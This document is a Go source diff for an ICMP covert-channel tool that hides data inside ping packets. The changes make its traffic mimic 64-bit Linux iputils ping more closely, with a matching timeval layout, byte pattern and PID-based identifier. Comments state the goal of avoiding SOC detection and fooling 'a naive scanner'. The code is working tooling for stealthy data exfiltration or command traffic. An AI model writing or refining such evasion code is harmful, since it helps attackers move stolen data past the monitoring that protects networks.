@@ -8,7 +8,6 @@
 package network
 
 import (
-	"crypto/rand"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -58,25 +57,25 @@ func NewNetworkService(config NetworkConfig, sessionID string) (*NetworkService,
 		return nil, fmt.Errorf("failed to create ICMP connection (need root): %w", err)
 	}
 
-	// Randomize both sequence number and ICMP identifier per session.
-	// Real ping uses the process PID as identifier, but it only runs briefly.
-	// A long-running process with a fixed identifier sending many packets is a
-	// strong SOC detection signal — random per-session ID breaks that pattern.
-	var rndBuf [4]byte
-	rand.Read(rndBuf[:])
-	startSeq := binary.BigEndian.Uint16(rndBuf[0:2])
-	sessionID16 := binary.BigEndian.Uint16(rndBuf[2:4])
-
 	service := &NetworkService{
 		conn:       conn,
 		config:     config,
 		sessionID:  sessionID,
-		sequenceID: startSeq,
-		processID:  sessionID16, // per-session random, not static PID
+		sequenceID: 0,             // seq starts at 0; first buildICMPPacket increment → 1 (iputils behaviour)
+		processID:  icmpIDFromOS(), // Linux = getpid()&0xFFFF, Windows = 0x0001
 		metrics:    &types.NetworkMetrics{},
 	}
 
 	return service, nil
+}
+
+// SetProcessID overrides the ICMP identifier for the session.
+// Default is OS-native (Linux PID, Windows 0x0001). Pass a 0-65535 value for
+// a fixed ID, or call with the result of a random uint16 for random mode.
+func (n *NetworkService) SetProcessID(id uint16) {
+	n.mu.Lock()
+	n.processID = id
+	n.mu.Unlock()
 }
 
 // SendPacket sends a network packet to the target
@@ -374,7 +373,7 @@ func (pb *PacketBuilder) createLegitimatePayload(data []byte, targetSize int) []
 
 // CreateStealthChunks splits large data into multiple stealth packets
 func (pb *PacketBuilder) CreateStealthChunks(data []byte) []*types.NetworkPacket {
-	const maxDataPerPacket = 48 // 56 - 8 (ping pattern) = 48 bytes of hidden data per packet
+	const maxDataPerPacket = 38 // 56 - 16 timeval - 2 length = 38 bytes per packet
 
 	var chunks []*types.NetworkPacket
 	totalChunks := (len(data) + maxDataPerPacket - 1) / maxDataPerPacket
@@ -433,13 +432,13 @@ func (pb *PacketBuilder) CreateStealthChunksWithSignature(data []byte, signature
 	var maxDataPerPacket int
 	switch signature {
 	case "windows":
-		maxDataPerPacket = 24 // 32 - 8 pattern = 24 bytes max
+		maxDataPerPacket = 24 // 32 - 8 alphabet prefix = 24 bytes max
 	case "none":
 		maxDataPerPacket = 1400 // Raw ICMP allows much larger payloads
 	case "linux":
 		fallthrough
 	default:
-		maxDataPerPacket = 48 // 56 - 8 pattern = 48 bytes max
+		maxDataPerPacket = 38 // 56 - 16 timeval - 2 length = 38 bytes max
 	}
 
 	var chunks []*types.NetworkPacket
@@ -478,7 +477,7 @@ func FragDataCapacity(signature string) int {
 	case "linux", "":
 		fallthrough
 	default:
-		return 42 // 46 stealth capacity − 4 byte frag header
+		return 34 // 38 stealth capacity (40B region − 2B length) − 4 byte frag header
 	}
 }
 
@@ -570,41 +569,37 @@ func (nu *NetworkUtils) GetLocalInterface() (*net.Interface, error) {
 	return nil, fmt.Errorf("no suitable network interface found")
 }
 
-// createLinuxPingPayload creates a 56-byte payload matching iputils/iproute2 ping output:
-//   [0..7]  struct timeval (tv_sec uint32 LE + tv_usec uint32 LE)
-//   [8..55] sequential: 0x08, 0x09, 0x0a, …, 0x37
-// Data is XOR'd into bytes [8..55] so the timeval region stays naturally varying.
+// createLinuxPingPayload creates a 56-byte payload matching iputils ping on 64-bit Linux:
+//   [0..15]  struct timeval  (tv_sec uint64 LE + tv_usec uint64 LE)
+//   [16..55] sequential: 0x10, 0x11, …, 0x37
+//
+// iputils pre-fills the buffer with i=0..55 then memcpy's the 16-byte timeval over the
+// first 16 bytes, leaving the visible static region at 0x10..0x37.
+// Data is XOR'd into bytes [16..55] so the timeval stays naturally varying.
 func (pb *PacketBuilder) createLinuxPingPayload(data []byte) []byte {
 	result := make([]byte, 56)
 
-	// struct timeval in host byte order (little-endian on x86)
-	now := time.Now()
-	tvSec := uint32(now.Unix())
-	tvUsec := uint32(now.Nanosecond() / 1000)
-	result[0] = byte(tvSec)
-	result[1] = byte(tvSec >> 8)
-	result[2] = byte(tvSec >> 16)
-	result[3] = byte(tvSec >> 24)
-	result[4] = byte(tvUsec)
-	result[5] = byte(tvUsec >> 8)
-	result[6] = byte(tvUsec >> 16)
-	result[7] = byte(tvUsec >> 24)
-
-	// Sequential fill starting at 0x08 (iputils ping classic pattern)
-	for i := 8; i < 56; i++ {
+	// Pre-fill with sequential bytes 0x00..0x37 (iputils pattern before timeval overwrite)
+	for i := 0; i < 56; i++ {
 		result[i] = byte(i)
 	}
 
-	// Prepend 2-byte big-endian length so extraction doesn't rely on null-byte sentinels.
-	// Max payload: 46 bytes (48 region − 2 length bytes).
+	// 64-bit Linux ABI: struct timeval = uint64 tv_sec + uint64 tv_usec (LE)
+	now := time.Now()
+	binary.LittleEndian.PutUint64(result[0:8], uint64(now.Unix()))
+	binary.LittleEndian.PutUint64(result[8:16], uint64(now.Nanosecond()/1000))
+
+	// Data embedding region: bytes [16..55] (40 bytes total).
+	// 2-byte big-endian length prefix + up to 38 bytes of data, each XOR'd with the
+	// sequential pattern so the region still looks like 0x10..0x37 to a naive scanner.
 	if len(data) > 0 {
-		if len(data) > 46 {
-			data = data[:46]
+		if len(data) > 38 {
+			data = data[:38]
 		}
-		result[8] ^= byte(len(data) >> 8)
-		result[9] ^= byte(len(data))
+		result[16] ^= byte(len(data) >> 8)
+		result[17] ^= byte(len(data))
 		for i, b := range data {
-			result[10+i] ^= b
+			result[18+i] ^= b
 		}
 	}
 
